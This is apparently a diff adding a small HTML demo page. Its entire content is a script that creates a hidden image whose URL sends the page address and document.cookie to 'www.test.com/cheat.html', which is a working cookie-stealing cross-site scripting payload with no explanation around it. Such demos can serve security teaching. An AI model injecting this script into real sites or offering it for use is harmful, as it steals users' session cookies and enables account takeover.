@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<title>demo</title>
+	</head>
+	<body>
+		<script>
+			var img = document.createElement('img');
+			img.src =
+				'http://www.test.com/cheat.html?url=' +
+				escape(window.location.href) +
+				'&content=' +
+				escape(document.cookie);
+			img.style = 'display:none';
+			document.body.appendChild(img);
+		</script>
+	</body>
+</html>
